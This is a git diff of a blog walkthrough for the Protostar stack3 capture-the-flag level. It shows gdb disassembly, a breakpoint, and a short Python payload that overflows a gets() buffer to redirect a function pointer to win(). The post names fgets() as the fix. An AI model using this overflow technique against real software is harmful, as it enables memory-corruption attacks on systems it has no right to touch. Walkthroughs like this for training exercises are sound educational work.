@@ -1,7 +1,7 @@
 ---
 title: "Protostar stack3 walkthrough"
 date: 2020-05-21
-tags: [ctf, protostar, stack3, walkthrough]
+tags: [buffer overflow, protostar, stack3, walkthrough]
 header:
   image: "/images/protostar/protostar.png"
 ---
@@ -17,7 +17,7 @@ both gdb and objdump is your friend you determining where the win() function lie
 This level is at /opt/protostar/bin/stack3
 
 #### Source code:
-```
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -46,21 +46,30 @@ int main(int argc, char **argv)
 
 #### Procedure:
 
-Similar to stack0, the program is using `gets()` function to write input into a buffer. And the variable 'fp' which is a function pointer needs to be changed from 0 to address of 'win' function.
+Similar to stack0, the program is using `gets()` function to write input into a buffer. And the variable 'fp' which is a function pointer needs to be changed from 0 to address of 'win()' function.
 
-So first we need to find 'win' address using objdump and write it to the address of 'fp' variable
+So first we need to find 'win()' address using objdump and write it to the address of 'fp' variable
 
 ##### Vulnerability:
 
-`gets` is vulnerable as it is impossible to tell how many characters gets() will reaed. it will continue to store the characters past the end of buffer.
-`fgets` needs to be used instead.
+`gets()` is vulnerable as it is impossible to tell how many characters gets() will reaed. it will continue to store the characters past the end of buffer.
+`fgets()` needs to be used instead.
 
 
 ##### Disassembly:
 
+Lets start by disassembling the binary
+
+```
+gdb ./stack3
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+```
+
+
 ![disassembly]({{site.url}}{{site.baseurl}}/images/protostar/stack3/disassemble.png)
 
-'fp' is stored at $esp+0x5c. It is moved into eax and called at 0x08048477. Out aim is to overwrite $esp value at this point. Lets put breapoint at this call.
+'fp' is stored at $esp+0x5c. It is moved into eax and called at 0x08048475. Out aim is to overwrite $esp value at this point. Lets put breapoint at this call.
 
 ```
 break *0x08048475
@@ -76,7 +85,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 We can see that $eax is changed to 0x41414141
 
-We can find address of 'win' using `x win`
+We can find address of 'win' function using `x win`
 ```
 (gdb) x win
 0x8048424 <win>:        0x83e58955
@@ -91,7 +100,7 @@ So, lets run with input AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP
 $eax contains 0x53535353, which is 'SSSS'
 
 Lets create a simple python program to create the string
-```
+```python
 padding = "AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
 padding += "\x24\x84\x04\x08"
 print padding
